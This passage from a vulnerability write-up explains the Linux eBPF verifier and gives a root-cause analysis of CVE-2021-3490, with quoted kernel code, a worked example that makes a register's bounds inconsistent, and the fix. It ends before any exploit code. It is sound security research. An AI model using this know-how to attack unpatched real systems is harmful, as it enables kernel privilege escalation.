+</span></p><h3 id="viewer-drpfr"><span>eBPF Maps</span></h3><p id="viewer-2geru"><span>I mentioned above that user mode processes can interact with a eBPF program in the kernel using eBPF maps. They can also be used by multiple eBPF programs to interact with each other. They are a generic key/value store with an arbitrary data structure <a href="https://prototype-kernel.readthedocs.io/en/latest/bpf/ebpf_maps.html" target="_blank" rel="noopener noreferrer">[6]</a>. There are various types of maps including: arrays, queues, and stacks.  </span></p><p id="viewer-elj25"><span>A map is described by five different attributes:</span></p><ul><li id="viewer-a2242"><p><span><span> type </span></span>- the data structure of the map</p></li><li id="viewer-dj88p"><p><span><span> key_size </span></span> - the size in bytes of the key used to index an element (used in array maps)</p></li><li id="viewer-13j8g"><p><span><span> value_size </span></span> - the size in bytes of each element </p></li><li id="viewer-f0a3i"><p><span><span> max_entries </span></span> - the maximum number of entries in the map</p></li><li id="viewer-16hrf"><p><span><span> map_flags </span></span> - describes special characteristics of the map, such as if the entire map memory should be preallocated or not.</p></li></ul><p id="viewer-t0aj"><span>eBPF maps can be created and altered from user space via the <span><span> bpf() </span></span> syscall using the 
+<span><span> BPF_MAP_CREATE </span></span> command, updated using the <span><span> BPF_MAP_UPDATE_ELEM </span></span> command, and retrieve its contents using the <span><span> BPF_MAP_LOOKUP_ELEM </span></span> command. eBPF maps can accessed by eBPF programs using the file descriptor returned by <span><span> BPF_MAP_CREATE </span></span> and calling eBPF helper functions, which will return pointers to values within the map. </span></p><h3 id="viewer-et7e3"><span>The eBPF Verifier</span></h3><p id="viewer-7pl2n"><span>The exploit I wrote leverages a bug in the eBPF verifier. So before I delve into the vulnerability it is important to briefly explain the internals of the verifier.  </span></p><p id="viewer-ftr7c"><span>The verifier starts by building a control flow graph of the program. Then, it will verify each instruction is valid and all memory accesses are safe through each possible flow of control <a href="https://www.spinics.net/lists/xdp-newbies/msg00185.html" target="_blank" rel="noopener noreferrer">[3]</a>. Afterwards, it will add in runtime checks to the program. This process, called <strong>ALU Sanitation</strong>, inserts patches to the eBPF bytecode to ensure permitted memory ranges are not violated during runtime when performing pointer arithmetic <a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener noreferrer">[4]</a>. </span></p><p id="viewer-3gd60"><span>The verifier tries to enforce these general set of rules:</span></p><ul><li id="viewer-fh0gi"><p>No back edges, loops, or unreachable instructions.</p></li><li id="viewer-62o7n"><p>No pointer comparisons can be performed, and only scalar values can be added or subtracted to a pointer. A scalar value in the eBPF verifier is any value that is not derived from a pointer. The verifier keeps track of which registers contain pointers and which contain scalar values. </p></li><li id="viewer-7m6mb"><p>Pointer arithmetic can not leave the “safe” bounds of a map. Meaning, the program can not access anything outside the predefined map memory. To do so, verifier keeps track of the upper and lower bounds of the values for each register.</p></li><li id="viewer-532b6"><p>No pointers can be stored in maps or stored as a return value, in order to avoid leaking kernel addresses to user space.</p></li></ul><h3 id="viewer-7q2oi"><span><strong>Range Tracking</strong></span></h3><p id="viewer-d96l9"><span>The verifier stores the following bound values, for every register in each possible path of execution, to ensure there are no out-of-bound memory accesses:</span></p><ul><li id="viewer-dpviu"><p><span><span> umin_value </span></span>, <span><span> umax_value </span></span> store the min/max value of the register when interpreted as an unsigned (64 bit) integer</p></li><li id="viewer-c7au1"><p><span><span> smin_value </span></span>,<span><span> smax_value </span></span> store the min/max value of the register when interpreted as a signed (64 bit) integer.</p></li><li id="viewer-2liii"><p><span><span> u32_min_value </span></span>,<span><span> u32min_value </span></span> store the min/max value of the register when interpreted as an unsigned (32 bit) integer.</p></li><li id="viewer-cm98c"><p><span><span> s32_min_value </span></span>,<span><span> s32_max_value </span></span> store the min/max value of the register when interpreted as a signed (32 bit) integer.</p></li><li id="viewer-clhcs"><p><span><span> var_off </span></span> contains information about the bits of the the register that are known. It is stored in a structure called <span><span> tnum </span></span> which contains two 64 bit fields: <span><span> mask </span></span> and <span><span> value </span></span>. Every bit that is set in <span><span> mask </span></span> means the value of that bit is <strong>unknown.  </strong>The unset bits are known, and their true value are stored in <span><span> value </span></span>. For example, if <span><span> var_off = {mask = 0x0; value = 0x1} </span></span>, all bits of the register are known, and the register is known to have a value of 1. If <span><span> var_off = {mask = 0xFFFFFFFF00000000; value = 0x3} </span></span> it means that the lower 32 bits of the register are known to be 0x00000003 and the upper 32 bits are unknown. </p></li></ul><p id="viewer-rfv9"><span>These bounds are used to update each other. In particular, if <span><span> var_off </span></span> indicates the register is a known constant, the min/max bounds are updated to reflect the known value. We will see why this is important later! </span></p><h3 id="viewer-d0ov"><span><strong>ALU Sanitation</strong>
+
+</span></h3><p id="viewer-3kee1"><span>ALU Sanitation is a feature that was introduced to supplement the static range tracking of the verifier. The idea is to prevent OOB memory accesses if the value of registers do not fall within their expected range during runtime.  This was added to help mitigate potential vulnerabilities in the verifier and protect against speculative attacks. 
+
+</span></p><p id="viewer-90rn"><span>For every arithmetic operation that involves a pointer and a scalar register, an <span><span> alu_limit </span></span> is calculated. This represents the maximum absolute value that can be added to or subtracted from the pointer <a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener noreferrer">[4]</a>. Before each of these operations, the bytecode is patched with the following instructions:</span></p><pre id="viewer-7vk3l"><span><span>*</span>patch<span>++</span> <span>=</span> <span>BPF_MOV32_IMM</span><span>(</span><span>BPF_REG_AX</span><span>,</span> aux<span>-</span><span>&gt;</span>alu_limit<span>)</span><span>;</span>
+<span>*</span>patch<span>++</span> <span>=</span> <span>BPF_ALU64_REG</span><span>(</span><span>BPF_SUB</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> off_reg<span>)</span><span>;</span>
+<span>*</span>patch<span>++</span> <span>=</span> <span>BPF_ALU64_REG</span><span>(</span><span>BPF_OR</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> off_reg<span>)</span><span>;</span>
+<span>*</span>patch<span>++</span> <span>=</span> <span>BPF_ALU64_IMM</span><span>(</span><span>BPF_NEG</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> <span>0</span><span>)</span><span>;</span>
+<span>*</span>patch<span>++</span> <span>=</span> <span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ARSH</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> <span>63</span><span>)</span><span>;</span>
+<span>*</span>patch<span>++</span> <span>=</span> <span>BPF_ALU64_REG</span><span>(</span><span>BPF_AND</span><span>,</span> <span>BPF_REG_AX</span><span>,</span> off_reg<span>)</span><span>;</span></span></pre><p id="viewer-6kqol"><span> Note that <span><span> off_reg </span></span> represents the scalar register being added to the pointer register, and 
+<span><span> BPF_REG_AUX </span></span> represents the auxiliary register. </span></p><p id="viewer-ehnbn"><span> The above instructions do the following:</span></p><ol><li id="viewer-abfdo"><p> The value of <span><span> alu_limit </span></span> is loaded into <span><span> BPF_REG_AX </span></span>.  </p></li><li id="viewer-90c3j"><p>The value of <span><span> off_reg </span></span> at runtime is subtracted from <span><span> alu_limit </span></span> and stored into 
+<span><span> BPF_REG_AX </span></span>. If  <span><span> off_reg &gt; alu_limit </span></span>, the highest bit of <span><span> BPF_REG_AX </span></span> is set (the sign bit).</p></li><li id="viewer-d82cr"><p>If the difference stored in <span><span> BPF_REG_AUX </span></span> is positive and off_reg is negative, indicating that <span><span> alu_limit </span></span> and the register’s value have opposing signs, the <span><span> BPF_OR </span></span> operation will set the sign bit. </p></li><li id="viewer-f5bdt"><p>The <span><span> BPF_NEG </span></span> operation will negate the sign bit. If the sign bit is set, it will become 0, and if not, it will become 1. </p></li><li id="viewer-ejpgf"><p>The <span><span> BPF_ARSH </span></span> operation does an arithmetic right shift of 63 bits. This fills 
+<span><span> BPF_REG_AX </span></span> with either all 0s or 1s, the value of the sign bit. </p></li><li id="viewer-68il8"><p>Depending on the result of the above operation, the <span><span> BPF_AND </span></span> operation will either null out <span><span> off_reg </span></span> or leave it unchanged.</p></li></ol><p id="viewer-dv950"><span>This means that if <span><span> off_reg </span></span> exceeds <span><span> alu_limit </span></span>, or if <span><span> off_reg </span></span> and <span><span> alu_limit </span></span> have opposing signs, the value of <span><span> off_reg </span></span> will be replaced with 0, nulling the pointer arithmetic operation.</span></p><p id="viewer-56lad"><span><strong>alu_limit Computation: </strong></span></p><p id="viewer-csuim"><span>The way <span><span> alu_limit </span></span> is calculated was <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0" target="_blank" rel="noopener noreferrer">recently updated</a> <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0" target="_blank" rel="noopener noreferrer">[15]</a>. The new implementation may not have been adopted yet by some Linux distributions. For completeness, I will cover both, and revisit why the differences matter as they become relevant in the next sections. </span></p><p id="viewer-5bauv"><span><strong>Previously:</strong></span></p><p id="viewer-3driu"><span>The <span><span> alu_limit </span></span> is determined by the boundaries of the <em>pointer</em> register. Meaning, if the pointer register points to the beginning of a map, the <span> <span>alu_limit</span> </span>  for subtraction is 0, and the alu_limit for addition is equal to the size of the map (minus 1). The <span><span> alu_limit </span></span> is updated with subsequent operations on the pointer register.</span></p><p id="viewer-8f1ck"><span><strong>Now:</strong></span></p><p id="viewer-m5le"><span>The <span><span> alu_limit </span></span> is determined by the boundaries of the <em>offset</em> register. Meaning if the value of the offset register at runtime is compared against the register’s boundaries computed during the verifier’s static range tracking. </span></p><p id="viewer-6t272"><span><em>My initial knowledge of the eBPF verifier came from this excellent </em><a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener noreferrer"><em>blog post</em></a><em> by Manfred Paul detailing his exploitation of CVE-2020-8835. I highly recommend checking it out!</em>
+
+</span></p><h2 id="viewer-5gsgv"><span>The Vulnerability</span></h2><p id="viewer-833qq"><span>We now have enough background to do a root cause analysis of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490" target="_blank" rel="noopener noreferrer">CVE-2021-3490</a>. 
+
+</span></p><p id="viewer-2qqo7"><span>Recall that the eBPF instruction set can operate on both the entire 64 bits of registers or just the lower 32 bits. For this reason, the verifier range tracking contains separate bounds for the lower 32 bits of a register: <span><span> {u,s}32_{min,max}_value </span></span>.
+
+</span></p><p id="viewer-fcb36"><span>These bounds are updated for every operation. Each operation has two tracking functions with a 64 bit and a 32 bit counter part. Both are called for a 64 bit operation in the function    <a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7479" target="_blank" rel="noopener noreferrer"><span>adjust_scalar_min_max_vals</span></a><span> </span>.  </span></p><pre id="viewer-d44jv"><span><span>*</span>
+<span>/* WARNING: This function does calculations on 64-bit values, but  * the actual execution may occur on 32-bit values. Therefore,      * things like bitshifts need extra checks in the 32-bit case.
+*/</span>
+<span>static</span> int <span>adjust_scalar_min_max_vals</span><span>(</span><span>struct bpf_verifier_env *env,
+                                      struct bpf_insn *insn,
+                                      struct bpf_reg_state 
+                                                  *dst_reg,
+                                      struct bpf_reg_state src_reg</span><span>)</span>
+<span>{</span>
+<span>...</span>
+        <span>case</span> <span>BPF_AND</span><span>:</span>
+                dst_reg<span>-</span><span>&gt;</span>var_off <span>=</span> <span>tnum_and</span><span>(</span>dst_reg<span>-</span><span>&gt;</span>var_off<span>,</span>       
+                src_reg<span>.</span>var_off<span>)</span><span>;</span>
+                <span>scalar32_min_max_and</span><span>(</span>dst_reg<span>,</span> <span>&amp;</span>src_reg<span>)</span><span>;</span>
+                <span>scalar_min_max_and</span><span>(</span>dst_reg<span>,</span> <span>&amp;</span>src_reg<span>)</span><span>;</span>
+                <span>break</span><span>;</span>
+        <span>case</span> <span>BPF_OR</span><span>:</span>
+                dst_reg<span>-</span><span>&gt;</span>var_off <span>=</span> <span>tnum_or</span><span>(</span>dst_reg<span>-</span><span>&gt;</span>var_off<span>,</span>  
+                src_reg<span>.</span>var_off<span>)</span><span>;</span>
+                <span>scalar32_min_max_or</span><span>(</span>dst_reg<span>,</span> <span>&amp;</span>src_reg<span>)</span><span>;</span>
+                <span>scalar_min_max_or</span><span>(</span>dst_reg<span>,</span> <span>&amp;</span>src_reg<span>)</span><span>;</span>
+                <span>break</span><span>;</span>
+        <span>case</span> <span>BPF_XOR</span><span>:</span>
+                dst_reg<span>-</span><span>&gt;</span>var_off <span>=</span> <span>tnum_xor</span><span>(</span>dst_reg<span>-</span><span>&gt;</span>var_off<span>,</span>   
+                src_reg<span>.</span>var_off<span>)</span><span>;</span>
+                <span>scalar32_min_max_xor</span><span>(</span>dst_reg<span>,</span> <span>&amp;</span>src_reg<span>)</span><span>;</span>
+                <span>scalar_min_max_xor</span><span>(</span>dst_reg<span>,</span> <span>&amp;</span>src_reg<span>)</span><span>;</span>
+                <span>break</span><span>;</span>
+                
+<span>...</span>
+<span>}</span>        </span></pre><p id="viewer-bsi5f"><span>The bug, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490" target="_blank" rel="noopener noreferrer">CVE-2021-3490</a>, is found in the 32 bit tracking function for <span><span> BPF_AND </span></span>, <span><span> BPF_OR </span></span>, and <span><span> BPF_XOR </span></span> operations. It is the same in each of the functions.</span></p><p id="viewer-biuc4"><span>Let’s take a look at an excerpt of the <a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7080" target="_blank" rel="noopener noreferrer">offending code</a> for <span><span> BPF_AND </span></span>:</span></p><pre id="viewer-3n5op"><span><span>static</span> <span>void</span> <span>scalar32_min_max_and</span><span>(</span><span>struct bpf_reg_state *dst_reg,
+                                 struct bpf_reg_state *src_reg</span><span>)</span>
+<span>{</span>
+    bool src_known <span>=</span> <span>tnum_subreg_is_const</span><span>(</span>src_reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+    bool dst_known <span>=</span> <span>tnum_subreg_is_const</span><span>(</span>dst_reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+    struct tnum var32_off <span>=</span> <span>tnum_subreg</span><span>(</span>dst_reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+    s32 smin_val <span>=</span> src_reg<span>-</span><span>&gt;</span>s32_min_value<span>;</span>
+    u32 umax_val <span>=</span> src_reg<span>-</span><span>&gt;</span>u32_max_value<span>;</span>
+
+
+    <span>/* Assuming scalar64_min_max_and will be called so its safe
+    * to skip updating register for known 32-bit case.
+    */</span>
+    <span>if</span> <span>(</span>src_known <span>&amp;&amp;</span> dst_known<span>)</span>
+        <span>return</span><span>;</span>
+<span>...</span>
+<span>}</span></span></pre><p id="viewer-158a9"><span>As shown in the code snippet above, if the lower 32 bits of both the source and destination register are known, the function skips updating the 32 bit bounds.</span></p><p id="viewer-dr148"><span> The comment above the return states that this is OK, because the <a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7116" target="_blank" rel="noopener noreferrer">64 bit</a><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7116" target="_blank" rel="noopener noreferrer"> counterpart</a> will take care of it. Let’s take a look: </span></p><pre id="viewer-f1h91"><span><span>static</span> <span>void</span> <span>scalar_min_max_and</span><span>(</span><span>struct bpf_reg_state *dst_reg,
+                              struct bpf_reg_state *src_reg</span><span>)</span>
+<span>{</span>
+    bool src_known <span>=</span> <span>tnum_is_const</span><span>(</span>src_reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+    bool dst_known <span>=</span> <span>tnum_is_const</span><span>(</span>dst_reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+    s64 smin_val <span>=</span> src_reg<span>-</span><span>&gt;</span>smin_value<span>;</span>
+    u64 umin_val <span>=</span> src_reg<span>-</span><span>&gt;</span>umin_value<span>;</span>
+
+    <span>if</span> <span>(</span>src_known <span>&amp;&amp;</span> dst_known<span>)</span> <span>{</span>
+            <span>__mark_reg_known</span><span>(</span>dst_reg<span>,</span> dst_reg<span>-</span><span>&gt;</span>var_off<span>.</span>value<span>)</span><span>;</span>
+            <span>return</span><span>;</span>
+    <span>}</span>
+  <span>...</span>
+<span>}</span></span></pre><p id="viewer-a7i2j"><span>Indeed, we can see if <span><span> src_known </span></span> and <span><span> dst_known </span></span> are true, the function <span><span> __mark_reg_known </span></span> will be called. Can you spot the problem? </span></p><p id="viewer-9k9r3"><span>In <span><span> scalar32_min_max_and </span></span>, the <span><span> _known </span></span> variable is calculated using <span><span> tnum_subreg_is_const </span></span> .  The 64 bit counterpart,  <span><span> scalar_min_max_and </span></span>, uses <span><span> tnum_is_const </span></span>. The difference is that the former returns true if the the lower 32 bits of the register are known constants, and the latter returns true only if the entire 64 bits are constant. If the operation involves registers where the lower 32 bits are known but the upper 32 bits are unknown, the assumption stated in the comment is violated.</span></p><p id="viewer-8t2o0"><span>In the function <span><span> adjust_scalar_min_max_vals </span></span>,  before returning, the bounds of the destination register are updated a last time by calling the <a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7638" target="_blank" rel="noopener noreferrer">following three functions</a>:</span></p><pre id="viewer-5b5ud"><span><span>__update_reg_bounds</span><span>(</span>dst_reg<span>)</span><span>;</span>
+<span>__reg_deduce_bounds</span><span>(</span>dst_reg<span>)</span><span>;</span>
+<span>__reg_bound_offset</span><span>(</span>dst_reg<span>)</span><span>;</span>
+<span>return</span> <span>0</span><span>;</span></span></pre><p id="viewer-93q4h"><span>Each of these functions have 32 and 64 bit counterparts. I’ll just cover the 32 bit case, since that is what the bug affects. </span></p><p id="viewer-9afvs"><span>First, the registers bounds are <a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L1229" target="_blank" rel="noopener noreferrer">updated using the current bounds </a>and <span><span> var_off </span></span>.</span></p><pre id="viewer-8gim"><span><span>static</span> <span>void</span> <span>__update_reg32_bounds</span><span>(</span><span>struct bpf_reg_state *reg</span><span>)</span>
+<span>{</span>
+    struct tnum var32_off <span>=</span> <span>tnum_subreg</span><span>(</span>reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>;</span>
+
+    <span>/* min signed is max(sign bit) | min(other bits) */</span>
+    reg<span>-</span><span>&gt;</span>s32_min_value <span>=</span> <span>max_t</span><span>(</span>s32<span>,</span> reg<span>-</span><span>&gt;</span>s32_min_value<span>,</span>
+                               var32_off<span>.</span>value <span>|</span> <span>(</span>var32_off<span>.</span>mask <span>&amp;</span> 
+                               <span>S32_MIN</span><span>)</span><span>)</span><span>;</span>
+        
+     <span>/* max signed is min(sign bit) | max(other bits) */</span>
+     reg<span>-</span><span>&gt;</span>s32_max_value <span>=</span> <span>min_t</span><span>(</span>s32<span>,</span> reg<span>-</span><span>&gt;</span>s32_max_value<span>,</span>
+                                var32_off<span>.</span>value <span>|</span> <span>(</span>var32_off<span>.</span>mask <span>&amp;</span> 
+                                <span>S32_MAX</span><span>)</span><span>)</span><span>;</span>
+     reg<span>-</span><span>&gt;</span>u32_min_value <span>=</span> <span>max_t</span><span>(</span>u32<span>,</span> reg<span>-</span><span>&gt;</span>u32_min_value<span>,</span>
+                               <span>(</span>u32<span>)</span>var32_off<span>.</span>value<span>)</span><span>;</span>
+     reg<span>-</span><span>&gt;</span>u32_max_value <span>=</span> <span>min</span><span>(</span>reg<span>-</span><span>&gt;</span>u32_max_value<span>,</span>
+                             <span>(</span>u32<span>)</span><span>(</span>var32_off<span>.</span>value <span>|</span>
+                              var32_off<span>.</span>mask<span>)</span><span>)</span><span>;</span>
+<span>}</span></span></pre><p id="viewer-46ppg"><span>Notice that the min bounds set to either the current min or the known value of register, whichever is larger. Similarly, the max bounds are set either the current max, or the known value of the register, whichever is smaller.
+
+</span></p><p id="viewer-e4d9o"><span>Then, the signed and unsigned bounds are used to update each other in  <a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L1264" target="_blank" rel="noopener noreferrer"><span>__reg32_deduce_bounds</span></a><span> </span>.</span></p><pre id="viewer-f9qg2"><span><span>/* Uses signed min/max values to inform unsigned, and vice-versa */</span>
+
+<span>static</span> <span>void</span> <span>__reg32_deduce_bounds</span><span>(</span><span>struct bpf_reg_state *reg</span><span>)</span>
+<span>{</span>
+    <span>/* Learn sign from signed bounds.
+     * If we cannot cross the sign boundary, then signed and
+     * unsigned bounds
+     * are the same, so combine.  This works even in the
+     * negative case, e.g.
+     * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.
+     */</span>
+    <span>if</span> <span>(</span>reg<span>-</span><span>&gt;</span>s32_min_value <span>&gt;=</span> <span>0</span> <span>||</span> reg<span>-</span><span>&gt;</span>s32_max_value <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
+            reg<span>-</span><span>&gt;</span>s32_min_value <span>=</span> reg<span>-</span><span>&gt;</span>u32_min_value <span>=</span>
+                        <span>max_t</span><span>(</span>u32<span>,</span> reg<span>-</span><span>&gt;</span>s32_min_value<span>,</span> 
+                        reg<span>-</span><span>&gt;</span>u32_min_value<span>)</span><span>;</span>
+                reg<span>-</span><span>&gt;</span>s32_max_value <span>=</span> reg<span>-</span><span>&gt;</span>u32_max_value <span>=</span>
+                        <span>min_t</span><span>(</span>u32<span>,</span> reg<span>-</span><span>&gt;</span>s32_max_value<span>,</span> 
+                        reg<span>-</span><span>&gt;</span>u32_max_value<span>)</span><span>;</span>
+                <span>return</span><span>;</span>
+    <span>}</span>
+<span>...</span>
+<span>}</span>
+
+
+</span></pre><p id="viewer-e3uut"><span>Finally, the unsigned bounds are used to update <span><span> var_off </span></span> in <span> </span><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L1339" target="_blank" rel="noopener noreferrer"><span>__reg_bound_offset</span></a><span> </span>. </span></p><pre id="viewer-b79ue"><span><span>static</span> <span>void</span> <span>__reg_bound_offset</span><span>(</span><span>struct bpf_reg_state *reg</span><span>)</span>
+<span>{</span>
+    struct tnum var64_off <span>=</span> <span>tnum_intersect</span><span>(</span>reg<span>-</span><span>&gt;</span>var_off<span>,</span>
+                            <span>tnum_range</span><span>(</span>reg<span>-</span><span>&gt;</span>umin_value<span>,</span>
+                                       reg<span>-</span><span>&gt;</span>umax_value<span>)</span><span>)</span><span>;</span>                
+    struct tnum var32_off <span>=</span> <span>tnum_intersect</span><span>(</span><span>tnum_subreg</span><span>(</span>reg<span>-</span><span>&gt;</span>var_off<span>)</span><span>,</span><span>tnum_range</span><span>(</span>reg<span>-</span><span>&gt;</span>u32_min_value<span>,</span> reg<span>-</span><span>&gt;</span>u32_max_value<span>)</span><span>)</span><span>;</span>
+
+    reg<span>-</span><span>&gt;</span>var_off <span>=</span> <span>tnum_or</span><span>(</span><span>tnum_clear_subreg</span><span>(</span>var64_off<span>)</span><span>,</span> 
+                                             var32_off<span>)</span><span>;</span>
+<span>}</span></span></pre><p id="viewer-ftr7l"><span>Here,</span></p><ul><li id="viewer-3gl5h"><p><span><span> tnum_range </span></span> returns a <span><span> tnum </span></span> representing the possible values given a range of unsigned integers.</p></li><li id="viewer-9m36i"><p><span><span> tnum_intersect </span></span> takes two <span><span> tnum </span></span>s and combines the knowledge conveyed by both into a single <span><span> tnum </span></span>. </p></li></ul><p id="viewer-26fqq"><span>Let’s go through the steps using an example so we can understand why this is a critical vulnerability. 
+
+</span></p><p id="viewer-7m598"><span>Suppose we have the instruction <span><span>BPF_ALU64_REG(BPF_AND, R2, R3)</span></span>. This instruction performs an <span><span>AND</span></span> operation on registers <span><span>R2</span></span> and <span><span>R3</span></span> and saves the results in <span><span>R2</span></span>. </span></p><ul><li id="viewer-da3tf"><p><span><span>R2 </span></span>has <span><span>var_off = {mask = 0xFFFFFFFF00000000; value = 0x1}</span></span>, meaning the lower 32 bits are known to have a value of 1, and the upper 32 bits are unknown. Because the lower 32 bits of the register are known, its 32bit bounds are equal to the value.</p></li><li id="viewer-5fp69"><p><span><span>R3</span></span> has <span><span>var_off = {mask = 0x0; value = 0x100000002}</span></span>, meaning the entire 64 bits are known and equal to <span><span>0x100000002</span></span>. </p></li></ul><p id="viewer-95r1p"><span>The steps to update the 32 bit bounds of <span><span>R2</span></span> are as follows:</span></p><ol><li id="viewer-rcok"><p>As shown on line 12 of the snippet of <span><span>adjust_scalar_min_max_vals</span></span>, the function 
+<span><span>tnum_and</span></span> is called.  This will perform an AND operation and save the results in var_off of the destination register, <span><span>R2</span></span>. Recall, the lower 32 bits in both of the registers are known. All of the bits of R3 are known: the upper 31 bits of are 0, and the 32nd bit is 1. This means that <span><span> R2 </span></span> is left with <span><span> var_off = {mask = 0x100000000; value = 0x0} </span></span>. This is because 2 &amp; 1 = 0 (for the lower 32 bits), and all but the 32nd bit will be known to be 0, since <span><span> R3 </span></span> has a 1 in the 32nd bit. </p></li><li id="viewer-5dr3n"><p>On the next line, <span><span> scalar32_min_max_and </span></span> is called. We already know that this function will return immediately and make no changes to the bounds, because the lower 32 bits of both registers are known.</p></li><li id="viewer-e8uod"><p>Then <span><span> __update_reg32_bounds </span></span> is called. This will set <span><span> u32_max_value = 0 </span></span>, because the value of <span><span> var_off.value = 0 &lt; u32_max_value = 1 </span></span>. Similarly, it will set 
+<span><span> u32_min_value = 1 </span></span> because <span><span> var_off.value = 0 &lt; u32_min_value </span></span>. The same goes for the signed bounds. </p></li><li id="viewer-dt4mc"><p>The functions <span><span> __reg32_deduce_bounds </span></span> and <span><span> __reg_bound_offset </span></span>  will not make any changes to the bounds.</p></li></ol><p id="viewer-f9r2o"><span>Now we can see that in this case, we are left with a register where <span><span> {u,s}32_max_value = 0 &lt; {u,s}32_min_value = 1 </span></span>! </span></p><p id="viewer-dm2ti"><span>Now, let’s look at the patch. </span></p><pre id="viewer-aser2"><span>@@ <span>-</span><span>7084</span><span>,</span><span>11</span> <span>+</span><span>7084</span><span>,</span><span>10</span> @@ <span>static</span> <span>void</span> <span>scalar32_min_max_and</span><span>(</span>struct bpf_reg_state <span>*</span>dst_reg<span>,</span>
+         s32 smin_val <span>=</span> src_reg<span>-</span><span>&gt;</span>s32_min_value<span>;</span>
+         u32 umax_val <span>=</span> src_reg<span>-</span><span>&gt;</span>u32_max_value<span>;</span>
+ 
+<span>-</span>        <span>/* Assuming scalar64_min_max_and will be called so its safe
+-         * to skip updating register for known 32-bit case.
+-         */</span>
+<span>-</span>        <span>if</span> <span>(</span>src_known <span>&amp;&amp;</span> dst_known<span>)</span>
+<span>+</span>        <span>if</span> <span>(</span>src_known <span>&amp;&amp;</span> dst_known<span>)</span> <span>{</span>
+<span>+</span>                <span>__mark_reg32_known</span><span>(</span>dst_reg<span>,</span> var32_off<span>.</span>value<span>)</span><span>;</span>
+                 <span>return</span><span>;</span>
+<span>+</span>        <span>}</span>
+
+</span></pre><p id="viewer-62ilr"><span>Above we can see that now,<span><span>  __mark_reg32_known </span></span> is called on the destination register before returning if the lower 32 bits of the source and destination register are known constants.
+
+</span></p><p id="viewer-5ocps"><span>Why does this matter? Let’s take a look at what <span> </span><a href="https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L1093" target="_blank" rel="noopener noreferrer"><span>__mark_reg32_known</span></a><span> </span> does:</span></p><pre id="viewer-400li"><span><span>/* Mark the unknown part of a register (variable offset or scalar  * value) as known to have the value @imm.
+*/</span>
+<span>static</span> <span>void</span> <span>__mark_reg32_known</span><span>(</span><span>struct bpf_reg_state *reg, u64 imm</span><span>)</span>
+<span>{</span>
+    reg<span>-</span><span>&gt;</span>var_off <span>=</span> <span>tnum_const_subreg</span><span>(</span>reg<span>-</span><span>&gt;</span>var_off<span>,</span> imm<span>)</span><span>;</span>
+    reg<span>-</span><span>&gt;</span>s32_min_value <span>=</span> <span>(</span>s32<span>)</span>imm<span>;</span>
+    reg<span>-</span><span>&gt;</span>s32_max_value <span>=</span> <span>(</span>s32<span>)</span>imm<span>;</span>
+    reg<span>-</span><span>&gt;</span>u32_min_value <span>=</span> <span>(</span>u32<span>)</span>imm<span>;</span>
+    reg<span>-</span><span>&gt;</span>u32_max_value <span>=</span> <span>(</span>u32<span>)</span>imm<span>;</span>
+<span>}</span>
+
+</span></pre><p id="viewer-10o32"><span>The function above sets all the of the 32 bit boundaries to the value of the register’s lower 32 bits, which are known to be constant. The correct bounds will be conserved when the final boundary updating functions are called, fixing the bug.</span></p><h2 id="viewer-8jk1p"><span>Debugging eBPF Programs</span></h2><p id="viewer-89fhg"><span>Before getting into exploitation, I’ll briefly cover a couple of ways to debug eBPF programs when writing exploits. I specifically say “when writing exploits”, because there are many tools available to help write and debug eBPF programs for legitimate uses, via emulation. One such tool is <a href="https://github.com/qmonnet/rbpf" target="_blank" rel="noopener noreferrer">rbpf</a><a href="https://github.com/qmonnet/rbpf" target="_blank" rel="noopener noreferrer"> </a><a href="https://github.com/qmonnet/rbpf" target="_blank" rel="noopener noreferrer">[10]</a>, which is a Rust user space virtual machine for eBPF. However, because I exploited a bug in the eBPF verifier, it was important to be able to debug it directly in the kernel to replicate the exact behavior. Additionally, I wrote the bytecode by hand (as opposed to using a 